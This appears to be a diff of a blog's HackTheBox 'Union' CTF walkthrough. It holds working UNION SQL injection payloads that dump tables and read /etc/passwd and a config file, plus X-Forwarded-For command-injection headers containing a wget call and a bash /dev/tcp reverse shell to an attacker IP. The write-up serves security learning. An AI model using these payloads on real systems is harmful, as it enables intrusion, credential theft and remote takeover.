@@ -12,7 +12,7 @@
   <meta name="title" content="Union Walkthrough(HTB) &middot; Secure The Throne" />
   
   <meta name="description" content="Union is an medium difficulty linux machine featuring a web application that is vulnerable to SQL Injection. There are filters in place which prevent SQLMap from dumping the database. Users are intended to manually craft union statements to extract information from the database and website source code. The database contains a flag that can be used to authenticate against the machine and upon authentication the webserver runs an iptables command to enable port 22. The credentials for SSH are in the PHP Configuration file used to authenticate against MySQL. Once on the machine, users can examine the source code of the web application and find out by setting the X-FORWARDED-FOR header, they can perform command injection on the system command used by the webserver to whitelist IP Addresses." />
-  <meta name="keywords" content="medium, Windows, HTB, hacking, Active Directory, " />
+  <meta name="keywords" content="medium, Linux, HTB, hacking, Web, Walkthrough, " />
   
   
   <link rel="canonical" href="http://localhost:1313/Secure-The-Throne/posts/1741809498520-union-walkthroughhtb/" />
@@ -76,14 +76,16 @@
   <meta property="og:locale" content="en">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2025-03-12T00:00:00+00:00">
-    <meta property="article:modified_time" content="2025-03-12T00:00:00+00:00">
+    <meta property="article:published_time" content="2025-03-13T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-03-13T00:00:00+00:00">
     <meta property="article:tag" content="Medium">
-    <meta property="article:tag" content="Windows">
+    <meta property="article:tag" content="Linux">
     <meta property="article:tag" content="HTB">
     <meta property="article:tag" content="Hacking">
-    <meta property="article:tag" content="Active Directory">
+    <meta property="article:tag" content="Web">
+    <meta property="article:tag" content="Walkthrough">
     <meta property="og:image" content="http://localhost:1313/Secure-The-Throne/posts/1741809498520-union-walkthroughhtb/featured.jpeg">
+      <meta property="og:see_also" content="http://localhost:1313/Secure-The-Throne/posts/1741808245229-perfection-walkthroughhtb/">
       <meta property="og:see_also" content="http://localhost:1313/Secure-The-Throne/posts/1741762551259-caption-walkthroughhtb/">
       <meta property="og:see_also" content="http://localhost:1313/Secure-The-Throne/posts/1741592170890-backend-walkthroughhtb/">
       <meta property="og:see_also" content="http://localhost:1313/Secure-The-Throne/posts/1741345035294-forest-writeuphtb/">
@@ -111,15 +113,15 @@
       "name": "Emp5r0R"
     },
     "copyrightYear": "2025",
-    "dateCreated": "2025-03-12T00:00:00\u002b00:00",
-    "datePublished": "2025-03-12T00:00:00\u002b00:00",
+    "dateCreated": "2025-03-13T00:00:00\u002b00:00",
+    "datePublished": "2025-03-13T00:00:00\u002b00:00",
     
-    "dateModified": "2025-03-12T00:00:00\u002b00:00",
+    "dateModified": "2025-03-13T00:00:00\u002b00:00",
     
-    "keywords": ["medium","Windows","HTB","hacking","Active Directory"],
+    "keywords": ["medium","Linux","HTB","hacking","Web","Walkthrough"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "722"
+    "wordCount": "940"
   }]
   </script>
 
@@ -157,6 +159,9 @@
 
 
 
+
+
+<script defer src="/Secure-The-Throne/lib/typeit/typeit.umd.57f9bc6e047efc875cb4f2e9ca74c802de33638d2c3aff6d9b7eb3c7588c24649b6c3e51cd45f49c0ed0cf72aedbd694bf2d35f358a34076d63f9febabc0bd6f.js" integrity="sha512-V/m8bgR&#43;/IdctPLpynTIAt4zY40sOv9tm36zx1iMJGSbbD5RzUX0nA7Qz3Ku29aUvy0181ijQHbWP5/rq8C9bw=="></script>
 
 
 
@@ -680,7 +685,7 @@
 <div class="flex flex-row flex-wrap items-center">
   
   
-  <time datetime="2025-03-12T00:00:00&#43;00:00">12 March 2025</time><span class="px-2 text-primary-500">&middot;</span><span>722 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">4 mins</span><span class="px-2 text-primary-500">&middot;</span>
+  <time datetime="2025-03-13T00:00:00&#43;00:00">13 March 2025</time><span class="px-2 text-primary-500">&middot;</span><span>940 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">5 mins</span><span class="px-2 text-primary-500">&middot;</span>
 
 
 <script type="text/javascript" src="/Secure-The-Throne/js/zen-mode.min.eea5245cf9244ecbdf2c150d1c8833226c1541cadf6e98f63a7c9192b1a3676df2c3ec603b14f4cfaaa53971fd9d8955640c0f405bf3de2b43ee7a5fb29ae721.js" integrity="sha512-7qUkXPkkTsvfLBUNHIgzImwVQcrfbpj2OnyRkrGjZ23yw&#43;xgOxT0z6qlOXH9nYlVZAwPQFvz3itD7npfsprnIQ=="></script>
@@ -747,10 +752,10 @@
 </span>
   </span>
   
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/Secure-The-Throne/tags/windows/&#34;,'_self');return false;">
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/Secure-The-Throne/tags/linux/&#34;,'_self');return false;">
     <span class="flex" style="cursor: pointer;">
   <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Windows
+    Linux
   </span>
 </span>
   </span>
@@ -771,10 +776,18 @@
 </span>
   </span>
   
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/Secure-The-Throne/tags/active-directory/&#34;,'_self');return false;">
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/Secure-The-Throne/tags/web/&#34;,'_self');return false;">
     <span class="flex" style="cursor: pointer;">
   <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Active Directory
+    Web
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/Secure-The-Throne/tags/walkthrough/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Walkthrough
   </span>
 </span>
   </span>
@@ -939,7 +952,7 @@
     class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#reconnaissance--enumeration-linux">Reconnaissance &amp; Enumeration Linux</a></li>
+    <li><a href="#reconnaissance--enumeration">Reconnaissance &amp; Enumeration</a></li>
     <li><a href="#exploitation">Exploitation</a></li>
     <li><a href="#privilege-escalation">Privilege Escalation</a></li>
   </ul>
@@ -955,7 +968,7 @@
     class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#reconnaissance--enumeration-linux">Reconnaissance &amp; Enumeration Linux</a></li>
+    <li><a href="#reconnaissance--enumeration">Reconnaissance &amp; Enumeration</a></li>
     <li><a href="#exploitation">Exploitation</a></li>
     <li><a href="#privilege-escalation">Privilege Escalation</a></li>
   </ul>
@@ -1074,6 +1087,15 @@
     
     <div
         class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+        <a href="http://localhost:1313/Secure-The-Throne/posts/1741808245229-perfection-walkthroughhtb/">
+            Part 4: Perfection Walkthrough(HTB)
+        </a>
+    </div>
+    
+    
+    
+    <div
+        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
         Part 5: This Article
     </div>
     
@@ -1087,18 +1109,18 @@
         <div class="article-content max-w-prose mb-20">
           
 
-<h2 class="relative group">Reconnaissance &amp; Enumeration Linux 
-    <div id="reconnaissance--enumeration-linux" class="anchor"></div>
+<h2 class="relative group">Reconnaissance &amp; Enumeration 
+    <div id="reconnaissance--enumeration" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#reconnaissance--enumeration-linux" aria-label="Anchor">#</a>
+            style="text-decoration-line: none !important;" href="#reconnaissance--enumeration" aria-label="Anchor">#</a>
     </span>        
     
 </h2>
 <ul>
-<li>nmap scan results</li>
+<li>Nmap scan results</li>
 </ul>
 <pre tabindex="0"><code>PORT   STATE SERVICE VERSION
 80/tcp open  http    nginx 1.18.0 (Ubuntu)
@@ -1111,58 +1133,257 @@
 |_http-server-header: nginx/1.18.0 (Ubuntu)
 |_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).
 </code></pre><ul>
-<li>Interesting isn&rsquo;t it, that we only got port 80 open</li>
-<li>From the session cookie we can learn that, It&rsquo;s running using PHP</li>
-<li>Fired up a subdomain scan and got no  results</li>
-<li>![[Pasted image 20250113000957.png]]</li>
-<li>As this is a PHP ran web I fired up a directory fuzzing with extension <code>.php</code></li>
+<li>Interesting isn&rsquo;t it, we got opnly one port-80 open</li>
+<li>In the scan itslef we can see the <code>PHPSESSID</code> cookie, So, this is a PHP made website</li>
+<li>I eventually got bored looking at the website so fired up a subdomain scan and got no results
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250113000957.png?raw=true" alt="Pasted image 20250113000957.png" />
+    
+  </figure>
+</li>
+<li>After many unsuccessful attempts, as this is a PHP website I convinced myself to run a directory fuzzing with php extension</li>
 </ul>
-<pre tabindex="0"><code>ffuf -u http://union.htb/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -e .php -t 60
-</code></pre><ul>
-<li>Got some results</li>
-<li>![[Pasted image 20250113001145.png]]</li>
-<li>Cannot access the <code>/firewall.php</code> page</li>
-<li>The website have a Username check option if the username valid or did not present on the database It will provide a link to <code>challenge.php</code> where have to submit some kind of flag</li>
-<li>This parameter seems to be vulnerable to #SQLi . When I provide this payload I am getting different error</li>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ffuf -u http://union.htb/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -e .php -t <span class="m">60</span>
+</span></span></code></pre></div><ul>
+<li>Got some interesting results
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250113001145.png?raw=true" alt="Pasted image 20250113001145.png" />
+    
+  </figure>
+</li>
+<li><code>firewall.php</code> seems interesting but on accessing the page it&rsquo;s throwing errors, just now I was happy
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://media1.tenor.com/m/bKuF5df_YnkAAAAd/samob%C3%B3jstwo-cyanide-and-happiness.gif" alt="joy-killer" />
+    
+  </figure>
+</li>
+<li>This website has a Username check option if the username valid or did not present in the database then It will provide a link to <code>challenge.php</code>, there we have to submit some kind of flag. This is how the website works</li>
+<li>This username check parameter seems to be vulnerable to SQL injection. If you have no idea about SQL Injection, I have a small post for that, first check that and then come back here.
+
+<section class="space-y-10 w-full">
+    
+    
+        
+            
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <a class="flex flex-wrap article " href="/Secure-The-Throne/posts/1741343014156-sql-injection/">
+    
+        
+        <div class="w-full md:w-auto h-full thumbnail nozoom thumbnailshadow md:mr-7" style="background-image:url(/Secure-The-Throne/posts/1741343014156-sql-injection/featured_hu_c9e8eb4a914d0720.jpg);"></div>
+        
+      <div class=" mt-3 md:mt-0">
+      <div class="items-center text-left text-xl font-semibold">
+        
+        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
+          href="/Secure-The-Throne/posts/1741343014156-sql-injection/">SQl-Injection</div>
+        
+        
+        
+      </div>
+      <div class="text-sm text-neutral-500 dark:text-neutral-400">
+        
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  <time datetime="2025-03-07T00:00:00&#43;00:00">7 March 2025</time><span class="px-2 text-primary-500">&middot;</span><span>177 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">1 min</span>
+  
+
+  
+  
+</div>
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+</div>
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/Secure-The-Throne/tags/hacking/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Hacking
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/Secure-The-Throne/tags/server/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Server
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/Secure-The-Throne/tags/web/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Web
+  </span>
+</span>
+  </span>
+  
+  
+  
+  
+</div>
+
+
+
+
+      </div>
+      
+      <div class="py-1 max-w-fit prose dark:prose-invert">
+        
+      </div>
+      
+    </div>
+  </a>
+
+        
+    
+</section></li>
+<li>When I input this payload I got different error</li>
 </ul>
 <pre tabindex="0"><code>&#39;OR 1=1; -- -
-</code></pre><ul>
-<li>![[Pasted image 20250113001954.png]]</li>
-<li>As firewall is running SQLMap not working so have to play manually</li>
-<li>Got a Interesting response for this payload</li>
-</ul>
-<pre tabindex="0"><code>&#39; UNION select user(); -- -
-</code></pre><ul>
-<li>
-<p>![[Pasted image 20250113002241.png]]</p>
+</code></pre><p>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250113001145.png?raw=true" alt="Pasted image 20250113001954.png" />
+    
+  </figure>
+</p>
+<ul>
+<li>There is a firewall running on this web page so SQLMap will not work, Thus we have to do all the work manually
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://media1.tenor.com/m/o6gmreNhiwwAAAAC/so-much-to-do-too-much-to-do.gif" alt="too-much-of-work" />
+    
+  </figure>
 </li>
-<li>
-<p>Info about databases</p>
-</li>
+<li>While I was spamming with SQLi payloads I got an Interesting response for this payload</li>
 </ul>
-<pre tabindex="0"><code class="language-payload" data-lang="payload">&#39; UNION select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.schemata; -- -
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-SQL" data-lang="SQL"><span class="line"><span class="cl"><span class="s1">&#39; UNION select user(); -- -
+</span></span></span></code></pre></div><p>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250113002241.png?raw=true" alt="Pasted image 20250113002241.png" />
+    
+  </figure>
+</p>
+<ul>
+<li>To get the Info about databases, We can use this payload</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-SQL" data-lang="SQL"><span class="line"><span class="cl"><span class="s1">&#39; UNION select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.schemata; -- -
+</span></span></span></code></pre></div><ul>
 <li><strong>Output:</strong></li>
 </ul>
 <pre tabindex="0"><code>Sorry, mysql,information_schema,performance_schema,sys,november you are not eligible due to already qualifying.
 </code></pre><ul>
-<li>We got five databases but <code>november</code> seems more interesting</li>
+<li>We got five databases in the corresponding response but <code>november</code> seems more interesting, So lets see what&rsquo;s inside of it
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExeHRzNHNkZ2hvejg0aWN1YnljYXN5dHF2OTNsdTBjMjZqOHQ3ajBmaSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/KtJJVm1owcKs0Pil78/giphy.gif" alt="whats-inside" />
+    
+  </figure>
+</li>
 </ul>
-<pre tabindex="0"><code>&#39; UNION select group_concat(table_name) from INFORMATION_SCHEMA.tables where table_schema=&#39;november&#39;; -- -
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION select group_concat(table_name) from INFORMATION_SCHEMA.tables where table_schema=&#39;</span><span class="n">november</span><span class="s1">&#39;; -- -
+</span></span></span></code></pre></div><ul>
 <li><strong>Output:</strong></li>
 </ul>
 <pre tabindex="0"><code>Sorry, flag,players you are not eligible due to already qualifying.
 </code></pre><ul>
-<li><code>november</code> database has two tables</li>
+<li>We got what we needed <code>november</code> database has two tables, lets go in further</li>
 </ul>
-<pre tabindex="0"><code>&#39; UNION select group_concat(table_name, &#39;:&#39;, column_name) from INFORMATION_SCHEMA.columns where table_schema=&#39;november&#39;; -- -
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION select group_concat(table_name, &#39;</span><span class="p">:</span><span class="s1">&#39;, column_name) from INFORMATION_SCHEMA.columns where table_schema=&#39;</span><span class="n">november</span><span class="s1">&#39;; -- -
+</span></span></span></code></pre></div><ul>
 <li><strong>Output:</strong></li>
 </ul>
 <pre tabindex="0"><code>Sorry, flag:one,players:player you are not eligible due to already qualifying.
 </code></pre><ul>
-<li>Each had only one column so password column I guess. Going for <code>flag</code> table for now</li>
+<li>Each of the tables had only one column. For now I am going for <code>flag</code> table. Let&rsquo;s see&hellip;</li>
 </ul>
 <pre tabindex="0"><code>&#39; UNION select group_concat(one) from flag; -- -
 </code></pre><ul>
@@ -1170,9 +1391,14 @@
 </ul>
 <pre tabindex="0"><code>Sorry, &lt;redacted&gt; you are not eligible due to already qualifying.
 </code></pre><ul>
-<li>Got the flag and after submission of the flag to website firewalls lifted and port 22 is now accessible</li>
-<li>![[Pasted image 20250113003834.png]]</li>
-<li>nmap scan result for port 22</li>
+<li>I Got the flag not the HTB user flag but the platform flag for this box and after submission of the flag, the websit firewalls lifted and port 22 is now accessible
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250113003834.png?raw=true" alt="Pasted image 20250113003834.png" />
+    
+  </figure>
+</li>
+<li>Lets confirm this by a simple nmap scan on port <code>22</code></li>
 </ul>
 <pre tabindex="0"><code>❯ nmap -p 22 -A 10.10.11.128                            
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-12 23:42 IST
@@ -1186,10 +1412,10 @@ PORT   STATE SERVICE VERSION
 |   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
 |_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
 </code></pre><ul>
-<li>Got the users info</li>
+<li>Ok now let&rsquo;s continue with the SQLi, first I checked for the other tables and got the users info</li>
 </ul>
-<pre tabindex="0"><code>&#39; UNION select group_concat(player) from players; -- -
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION select group_concat(player) from players; -- -
+</span></span></span></code></pre></div><ul>
 <li><strong>Output:</strong></li>
 </ul>
 <pre tabindex="0"><code>Sorry, ippsec,celesian,big0us,luska,tinyboy you are not eligible due to already qualifying.
@@ -1206,10 +1432,10 @@ PORT   STATE SERVICE VERSION
     
 </h2>
 <ul>
-<li>Got the <code>/etc/passwd</code> file data</li>
+<li>This is one of the reasons why sql injection is so dangerous we can read system files using SQLi if it&rsquo;s misconfigured. Using the below payload I got the <code>/etc/passwd</code> file data</li>
 </ul>
-<pre tabindex="0"><code>&#39; UNION select load_file(&#39;/etc/passwd&#39;); -- -
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION select load_file(&#39;</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="s1">&#39;); -- -
+</span></span></span></code></pre></div><ul>
 <li><strong>Output:</strong></li>
 </ul>
 <pre tabindex="0"><code>Sorry, root:x:0:0:root:/root:/bin/bash
@@ -1250,18 +1476,18 @@ uhc:x:1001:1001:,,,:/home/uhc:/bin/bash
  you are not eligible due to already qualifying.
 </code></pre><ul>
 <li>
-<p>Found three valid users to access the system</p>
+<p>From reading the <code>/etc/passwd</code> file I identified three valid users to access the system</p>
 </li>
 <li>
-<p>Can also read the source code of the page</p>
+<p>We can also read the source code of this page</p>
 </li>
 </ul>
-<pre tabindex="0"><code>&#39; UNION select load_file(&#39;/var/www/html/index.php&#39;); -- -
-</code></pre><ul>
-<li>As we found the <code>config.php</code> via the directory fuzzing let&rsquo;s try getting it</li>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION select load_file(&#39;</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="k">index</span><span class="p">.</span><span class="n">php</span><span class="s1">&#39;); -- -
+</span></span></span></code></pre></div><ul>
+<li>If you remember earlier we found <code>config.php</code> via the directory fuzzing, so let&rsquo;s try getting it</li>
 </ul>
-<pre tabindex="0"><code>&#39; UNION select load_file(&#39;/var/www/html/config.php&#39;); -- -
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION select load_file(&#39;</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">config</span><span class="p">.</span><span class="n">php</span><span class="s1">&#39;); -- -
+</span></span></span></code></pre></div><ul>
 <li><strong>Output:</strong></li>
 </ul>
 <pre tabindex="0"><code>Sorry, &lt;?php
@@ -1275,8 +1501,23 @@ uhc:x:1001:1001:,,,:/home/uhc:/bin/bash
 ?&gt;
  you are not eligible due to already qualifying.
 </code></pre><ul>
-<li>Accessed SSH and got the user flag</li>
-<li>![[Pasted image 20250113005214.png]]</li>
+<li>We got the exposed password from the website configuration. Accessed the system using SSH and got the 
+<div class="flex mt-2">
+<span
+  class="rounded-full bg-primary-500 dark:bg-primary-400 text-neutral-50 dark:text-neutral-800 px-1.5 py-[1px] text-xs font-normal"
+>
+  <span class="flex flex-row items-center">
+    
+    <span>user flag</span>
+  </span>
+</span>
+</div>
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250113005214.png?raw=true" alt="Pasted image 20250113005214.png" />
+    
+  </figure>
+</li>
 </ul>
 
 
@@ -1291,49 +1532,94 @@ uhc:x:1001:1001:,,,:/home/uhc:/bin/bash
     
 </h2>
 <ul>
-<li>Looked onto the <code>firewall.php</code> code</li>
+<li>Quickly I started enumerating and eventually looked into the <code>firewall.php</code> code and I can see the vulnerable code</li>
 </ul>
-<pre tabindex="0"><code>&lt;?php
-  if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) {
-    $ip = $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];
-  } else {
-    $ip = $_SERVER[&#39;REMOTE_ADDR&#39;];
-  };
-  system(&#34;sudo /usr/sbin/iptables -A INPUT -s &#34; . $ip . &#34; -j ACCEPT&#34;);
-?&gt;
-</code></pre><ul>
-<li>This above part is vulnerable to command Injection</li>
-<li>Tested with this header payload and it worked</li>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_X_FORWARDED_FOR&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_X_FORWARDED_FOR&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="p">};</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">system</span><span class="p">(</span><span class="s2">&#34;sudo /usr/sbin/iptables -A INPUT -s &#34;</span> <span class="o">.</span> <span class="nv">$ip</span> <span class="o">.</span> <span class="s2">&#34; -j ACCEPT&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><ul>
+<li>This above part is vulnerable to command Injection, after a while I pictured the payload and I tested with this header payload and it worked</li>
 </ul>
-<pre tabindex="0"><code>X-FORWARDED-FOR: 8.8.8.8; wget http://10.10.14.4:8000/Union_AllPorts.txt;
-</code></pre><ul>
-<li>![[Pasted image 20250113011912.png]]</li>
-<li>Got a shell with this</li>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">X-FORWARDED-FOR: 8.8.8.8<span class="p">;</span> wget http://10.10.14.4:8000/Union_AllPorts.txt<span class="p">;</span>
+</span></span></code></pre></div><p>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250113011912.png?raw=true" alt="Pasted image 20250113011912.png" />
+    
+  </figure>
+</p>
+<ul>
+<li>Prepared a reverse shell payload and got the shell with this</li>
 </ul>
-<pre tabindex="0"><code>X-FORWARDED-FOR: 8.8.8.8; bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/10.10.14.4/6001 &lt;&amp;1&#39;;
-</code></pre><ul>
-<li>Upgraded the shell to be more stable using new technique</li>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">X-FORWARDED-FOR: 8.8.8.8<span class="p">;</span> bash -c <span class="s1">&#39;exec bash -i &amp;&gt;/dev/tcp/10.10.14.4/6001 &lt;&amp;1&#39;</span><span class="p">;</span>
+</span></span></code></pre></div><ul>
+<li>Upgraded the shell to be more stable using a new technique that I have learnt recently</li>
 </ul>
-<pre tabindex="0"><code>script /dev/null -c bash
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">script /dev/null -c bash
+</span></span></code></pre></div><ul>
 <li>Then foreground the shell with <code>CTRL+Z</code></li>
 </ul>
-<pre tabindex="0"><code>stty raw -echo; fg
-</code></pre><ul>
-<li>In the shell type this</li>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
+</span></span></code></pre></div><ul>
+<li>In the shell type this to allign it with our terminal</li>
 </ul>
-<pre tabindex="0"><code>reset
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">reset
+</span></span></code></pre></div><ul>
 <li>Now the shell is upgraded</li>
-<li>Issued this command <code>sudo -l</code> and found that <code>sudo</code> can be run with anything</li>
-<li>![[Pasted image 20250113012401.png]]</li>
-<li>So exploited it using</li>
+<li>Issued this command <code>sudo -l</code> and found that <code>sudo</code> can be run with anything
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250113012401.png?raw=true" alt="Pasted image 20250113012401.png" />
+    
+  </figure>
+</li>
+<li>Now easily ran the bash with root privileges</li>
 </ul>
 <pre tabindex="0"><code>sudo /bin/bash
 </code></pre><ul>
-<li>Got the root flag.</li>
-<li>![[Pasted image 20250113012505.png]]</li>
+<li>Got the 
+<div class="flex mt-2">
+<span
+  class="rounded-full bg-primary-500 dark:bg-primary-400 text-neutral-50 dark:text-neutral-800 px-1.5 py-[1px] text-xs font-normal"
+>
+  <span class="flex flex-row items-center">
+    
+    <span>Root flag</span>
+  </span>
+</span>
+</div>
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250113012505.png?raw=true" alt="Pasted image 20250113012505.png" />
+    
+  </figure>
+</li>
 </ul>
+<div id="typeit-27e0c872d57f3d9eb75f36e646aa748a"></div>
+
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+      new TypeIt("#typeit-27e0c872d57f3d9eb75f36e646aa748a", {
+        strings: [" This was a short box interms of my walkthrough. Anyway, see you again nextime...... "],
+        speed:  100 ,
